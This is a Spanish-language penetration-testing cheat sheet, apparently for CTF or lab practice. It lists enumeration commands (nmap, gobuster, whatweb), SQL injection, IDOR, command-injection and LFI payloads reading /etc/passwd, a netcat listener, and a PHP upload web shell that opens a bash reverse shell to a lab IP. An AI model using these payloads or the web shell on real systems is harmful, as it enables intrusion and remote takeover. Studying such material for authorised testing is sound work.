# HACKMEX Cheat Sheet

## Conceptos

**Internet Protocol (IP)**: identifica un dispositivo.

**Puertos**: identifica un servicio/app corriendo en un dispositivo.

Ejemplo formato `/etc/hosts`:

```text
10.10.10.10 www.example.com
```

Ejemplo formato URL:

```text
http://www.example.com:80/path/to/file.html?key1=value1&key2=value2#ID
```

## Comandos críticos

Conexión VPN:

```bash
sudo openvpn config.ovpn
```

Obtener IP local:

```bash
ip a show tun0
```

Esperar conexión:

```bash
nc -lvnp 4444
```

## Metodología

### Enumeración

Identificar OS (Linux TTL=64, Windows TTL=128):

```bash
ping -c 1 10.10.10.10
```

Descubrir puertos (80=http, 443=https):

```bash
sudo nmap -sT -vvv -oN scan.txt -n -Pn -T4 -p- 10.10.10.10
```

```bash
sudo nmap -sT -vvv -oN scan.txt -n -Pn -T4 -p1-1024 10.10.10.10
```

### Web

Descubrir tecnologías:

```bash
whatweb http://www.example.com
```

Descubrir contenido:

```bash
gobuster dir -t 64 -u 'http://www.example.com' -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Diccionario de directorios: `/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt`

Diccionario de archivos: `/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt`

### Vulnerabilidades

SQLi:

```text
/search?id=5'
/search?id=5' or 1=1-- -
/search?id=5' or sleep(5)-- -
```

IDOR:

```text
/account?id=1
/account?id=2
/account?id=3
```

[Command injection](https://www.revshells.com):

```text
command1 $(command2)
command1; command2
command1 | command2
command1 && command2
```

LFI:

```text
/?page=/etc/passwd
/?page=../../../etc/passwd
/?page=../../../../../../etc/passwd
```

File upload:

```php
<?php shell_exec("bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'"); ?>
```

### Privilege Escalation

Check `sudo` permissions:

```bash
sudo -l
```
